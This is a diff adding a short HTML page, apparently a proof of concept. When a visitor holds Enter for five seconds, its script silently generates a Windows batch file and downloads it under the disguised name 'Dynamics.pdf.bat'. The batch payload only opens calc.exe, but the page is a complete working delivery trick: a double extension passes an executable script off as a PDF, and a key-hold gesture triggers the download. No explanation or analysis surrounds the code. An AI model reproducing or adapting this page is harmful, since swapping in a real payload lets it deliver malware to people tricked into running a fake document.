@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hold Enter to Download</title>
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #111;
+      color: #0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    .info {
+      font-size: 18px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Hold ENTER for 5 seconds to download</h2>
+  <div class="info" id="status">Waiting...</div>
+
+  <script>
+    let timer;
+    let isHolding = false;
+
+    function downloadBlob() {
+      const payload = `@echo off\r\nstart calc.exe`;
+      const blob = new Blob([payload], { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'Dynamics.pdf.bat';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+
+      document.getElementById('status').textContent = 'Downloaded!';
+    }
+
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' && !isHolding) {
+        isHolding = true;
+        document.getElementById('status').textContent = 'Holding...';
+
+        timer = setTimeout(() => {
+          downloadBlob();
+        }, 5000); // 5 detik
+      }
+    });
+
+    document.addEventListener('keyup', function (e) {
+      if (e.key === 'Enter') {
+        clearTimeout(timer);
+        isHolding = false;
+        document.getElementById('status').textContent = 'Canceled. Hold again.';
+      }
+    });
+  </script>
+</body>
+</html>
